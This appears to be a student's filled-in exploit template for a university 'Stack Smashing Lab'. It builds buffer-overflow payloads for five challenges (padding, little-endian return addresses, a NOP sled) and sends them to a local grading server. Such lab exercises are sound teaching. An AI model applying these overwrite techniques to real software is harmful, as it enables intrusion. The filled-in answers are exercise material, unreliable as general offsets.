#!/usr/bin/env python3

import socket
import json
import struct

HOST = "127.0.0.1"
PORT = 5000


# =========================================================
# TODO: Replace with your assigned student ID
# =========================================================
STUDENT_ID = "belayf"


# =========================================================
# TODO: Choose challenge number (1–5)
# =========================================================
CHALLENGE = 5


# =========================================================
# Helper function (DO NOT MODIFY)
# =========================================================
def send_exploit(payload: bytes):

    request = {
        "student_id": STUDENT_ID,
        "challenge": CHALLENGE,
        "payload": payload.hex()
    }

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))

    sock.send(json.dumps(request).encode())

    response = sock.recv(4096)

    print("\n================ SERVER RESPONSE ================\n")
    print(response.decode())
    print("\n=================================================\n")

    sock.close()


# =========================================================
# TODO: Build your payload here
#
# HINTS:
# - Buffer sizes vary per challenge
# - Use b"A" * N to create padding
# - Use struct.pack("<I", address) for return addresses
# - Observe server output carefully before final attempt
# =========================================================
def build_payload():

    payload = b""

    # -----------------------------------------------------
    # TODO (Challenge 1):
    # - Known buffer size
    # - Overwrite return address with target value
    # -----------------------------------------------------
    if CHALLENGE == 1:
        OFFSET = 64
        TARGET = 0xDEADBEEF
        payload = b"A" * OFFSET + struct.pack("<I", TARGET)

    # Example structure (DO NOT assume values are correct):
    # payload = b"A" * OFFSET + struct.pack("<I", TARGET)

    # -----------------------------------------------------
    # TODO (Challenge 2):
        # - Find correct offset experimentally
    # - Use probe script to inspect behavior
    # -----------------------------------------------------
    if CHALLENGE == 2:
        TARGET = 0xCAFEBABE
        marker = struct.pack("<I", 0x42424242)
        OFFSET = 76

        print(f"[Challenge 2] Offset discovered: {OFFSET} bytes")
        payload = b"A" * OFFSET + struct.pack("<I", TARGET)

    # -----------------------------------------------------
    # TODO (Challenge 3):
    # - Handle little-endian formatting correctly
    # -----------------------------------------------------
    if CHALLENGE == 3:
        OFFSET = 68
        TARGET = 0x12345678
        payload = b"A" * OFFSET + struct.pack("<I", TARGET)

        # Observe server response to determine if crash occurs
        # If crash occurs, return the length as the offset
        # (This is a placeholder; actual implementation may vary)
    # -----------------------------------------------------
    # TODO (Challenge 4):
    # - Include NOP sled and marker "SHELL"
    # - Ensure correct placement in payload
    # -----------------------------------------------------
    if CHALLENGE == 4:
        OFFSET = 64
        nop_sled = b"\x90" * 16
        marker = b"SHELL"
        TARGET = 0xB16B00B5
        body = nop_sled + marker
        body = body.ljust(OFFSET, b"\x90")
        payload = body + struct.pack("<I", TARGET)

    # Example placeholders:
    # nop_sled = b"\x90" * 16
    # marker = b"SHELL"

    # -----------------------------------------------------
    # TODO (Challenge 5):
    # - NX enabled: must redirect execution
    # - No shellcode allowed (conceptually)
    # -----------------------------------------------------
    if CHALLENGE == 5:
        OFFSET = 64
        WIN_ADDR = 0x41414141
        payload = b"A" * OFFSET + struct.pack("<I", WIN_ADDR)
    return payload


# =========================================================
# Main execution
# =========================================================
def main():

    print("===========================================")
    print(" Stack Smashing Lab - Exploit Template")
    print("===========================================\n")

    print(f"Student ID: {STUDENT_ID}")
    print(f"Challenge: {CHALLENGE}\n")

    payload = build_payload()

    print(f"Payload size: {len(payload)} bytes")

    send_exploit(payload)


if __name__ == "__main__":
    main()
